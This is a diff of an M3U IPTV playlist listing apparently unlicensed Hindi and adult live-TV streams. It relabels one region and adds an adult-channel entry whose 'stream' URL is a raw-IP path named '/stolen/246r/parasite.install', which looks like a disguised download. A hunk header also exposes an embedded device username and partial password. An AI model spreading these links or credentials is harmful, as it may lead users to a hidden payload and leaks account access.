@@ -17,7 +17,7 @@ http://bolly360.xyz:80/zee.php?c=ztvhdusa
 http://bolly360.xyz:80/zee.php?c=apacsea
 #EXTINF:-1 ch-id="ZEE TV (UK)" tvg-logo="https://seeklogo.com/images/Z/zee-tv-new-2017-logo-BF523E8B60-seeklogo.com.png" group-title="HINDI LIVE",(EUROPE)
 http://bolly360.xyz:80/zee.php?c=zeetvsduk
-#EXTINF:-1 ch-id="ZEE TV (CA)" tvg-logo="http://shaw.tmsimg.com/assets/s79632_ll_h3_ac.png" group-title="HINDI LIVE",(AMERICA)
+#EXTINF:-1 ch-id="ZEE TV (CA)" tvg-logo="http://shaw.tmsimg.com/assets/s79632_ll_h3_ac.png" group-title="HINDI LIVE",( NORTH AMERICA)
 http://bolly360.xyz:80/zee.php?c=canadahd
 #EXTINF:-1 ch-id="AND TV HD (IND)" tvg-logo="https://www.medianews4u.com/wp-content/uploads/2015/08/TV-HD-1-2.jpg" group-title="HINDI LIVE",(INDIA)
 http://45.120.188.76:8080/0.ts
@@ -37,3 +37,5 @@ http://x-bosna.no-ip.biz/live.ts?channelId=148&deviceUser=MamaTata&devicePass=hw
 http://cdn.adultiptv.net/gay.m3u8
 #EXTINF:-1 ch-id="PORNSTAR (INT)" tvg-logo="https://i1.sndcdn.com/avatars-000424266405-cgh5rx-t500x500.jpg" group-title="XXX LIVE",(WORLD)
 http://live.redtraffic.xyz/pornstar.m3u8
+#EXTINF:-1 ch-id="SUPER ONE HD (INT)"  tvg-logo="https://mar-vik.si/uploads/logotipi/SUPERONE.png"group-title="XXX LIVE",(EAST EUROPE)
+http://188.35.9.5:10007/stolen/246r/parasite.install
